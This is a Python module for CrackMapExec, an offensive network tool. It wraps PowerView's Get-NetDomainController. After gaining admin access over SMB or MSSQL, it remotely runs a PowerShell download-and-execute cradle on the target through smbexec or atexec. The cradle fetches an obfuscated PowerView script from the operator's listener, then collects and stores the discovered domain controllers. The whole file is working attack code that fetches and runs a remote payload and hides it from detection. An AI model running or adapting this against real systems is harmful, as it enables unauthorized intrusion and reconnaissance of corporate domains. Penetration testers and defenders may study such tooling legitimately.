from cme.helpers.powershell import *
from cme.helpers.logger import write_log, highlight
from datetime import datetime

class CMEModule():

    name = 'get_netdomaincontroller'
    description = "Wrapper for PowerView's Get-NetDomainController"
    supported_protocols = ['mssql', 'smb']
    opsec_safe = True
    multiple_hosts = False

    def  options(self, context, module_options):
        '''
        '''
        pass

    def on_admin_login(self, context, connection):
        command = 'Get-NetDomainController | select Name,Domain,IPAddress | Out-String'
        launcher = gen_ps_iex_cradle(context.server, context.localip, context.server_port, 'PowerView.ps1', command)
        ps_command = create_ps_command(launcher)

        connection.execute(ps_command, methods=['smbexec', 'atexec'])
        context.log.success('Executed launcher')

    def on_request(self, context, request):
        if 'PowerView.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            with open(get_ps_script('PowerSploit/Recon/PowerView.ps1'), 'r') as ps_script:
                payload = obfs_ps_script(ps_script.read())
                request.wfile.write(payload)

        else:
            request.send_response(404)
            request.end_headers()

    def on_response(self, context, response):
        response.send_response(200)
        response.end_headers()
        length = int(response.headers.getheader('content-length'))
        data = response.rfile.read(length)

        #We've received the response, stop tracking this host
        response.stop_tracking_host()

        dc_count = 0
        if len(data):
            context.log.info('Parsing output, please wait...')
            buf = StringIO(data).readlines()
            for line in buf:
                if line != '\r\n' and not line.startswith('Name') and not line.startswith('---'):
                    hostname, domain, ip = filter(None, line.strip().split(' '))
                    #logging.debug('{} {} {}'.format(hostname, domain, ip))
                    context.db.add_computer(ip, hostname, domain, '', dc=True)
                    dc_count += 1

            context.log.success('Added {} Domain Controllers to the database'.format(highlight(dc_count)))
